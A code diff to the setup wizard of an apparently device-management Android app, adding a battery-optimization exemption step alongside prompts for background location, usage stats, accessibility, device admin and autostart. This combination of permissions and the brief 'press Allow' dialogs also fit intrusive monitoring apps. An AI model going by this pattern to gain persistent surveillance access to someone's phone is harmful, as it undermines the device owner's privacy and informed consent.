@@ -8,8 +8,6 @@ import android.app.usage.UsageStatsManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.app.usage.UsageStats;
-import android.app.usage.UsageStatsManager;
 import android.content.SharedPreferences;
 import android.net.Uri;
 import android.content.pm.PackageManager;
@@ -17,6 +15,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.text.TextUtils;
 import androidx.core.app.ActivityCompat;
@@ -32,14 +31,14 @@ public class MainActivity extends BridgeActivity {
     private static final int RC_BG_LOC       = 1002;
     private static final int RC_DEVICE_ADMIN = 2001;
 
-    // Simplified steps — only dialog-based, no surprise Settings launches
     private static final int STEP_PERMISSIONS   = 0;
     private static final int STEP_BG_LOCATION   = 1;
     private static final int STEP_USAGE         = 2;
     private static final int STEP_ACCESSIBILITY = 3;
     private static final int STEP_DEVICE_ADMIN  = 4;
-    private static final int STEP_OEM_AUTOSTART = 5;
-    private static final int STEP_DONE          = 6;
+    private static final int STEP_BATTERY       = 5; // exemption from Doze/battery optimizer
+    private static final int STEP_OEM_AUTOSTART = 6;
+    private static final int STEP_DONE          = 7;
 
     private static final String PREFS_NAME = "mdm_setup";
     private static final String KEY_DONE   = "setup_done";
@@ -96,6 +95,7 @@ public class MainActivity extends BridgeActivity {
             case STEP_USAGE:         doUsage();         break;
             case STEP_ACCESSIBILITY: doAccessibility(); break;
             case STEP_DEVICE_ADMIN:  doDeviceAdmin();   break;
+            case STEP_BATTERY:       doBatteryOptimization(); break;
             case STEP_OEM_AUTOSTART: doOemAutoStart();  break;
             case STEP_DONE:          doFinish();        break;
         }
@@ -252,7 +252,33 @@ public class MainActivity extends BridgeActivity {
         if (requestCode == RC_DEVICE_ADMIN) nextStep();
     }
 
-    // ── Step 4 — OEM AutoStart (Vivo only on this device) ────────────────
+    // ── Step 5 — Battery optimization exemption ──────────────────────────
+
+    private void doBatteryOptimization() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) { nextStep(); return; }
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
+            nextStep(); return; // already exempted
+        }
+        new AlertDialog.Builder(this)
+            .setTitle("Battery — Always On")
+            .setMessage(
+                "Phone ke sleep hone par bhi connected rehne ke liye ye permission chahiye.\n\n" +
+                "Agli screen mein 'Allow' dabao.")
+            .setCancelable(false)
+            .setPositiveButton("Allow", (d, w) -> {
+                try {
+                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    i.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(i);
+                } catch (Exception ignored) {}
+                nextStep();
+            })
+            .setNegativeButton("Skip", (d, w) -> nextStep())
+            .show();
+    }
+
+    // ── Step 6 — OEM AutoStart (Vivo only on this device) ────────────────
 
     private void doOemAutoStart() {
         String mfr = Build.MANUFACTURER.toLowerCase();
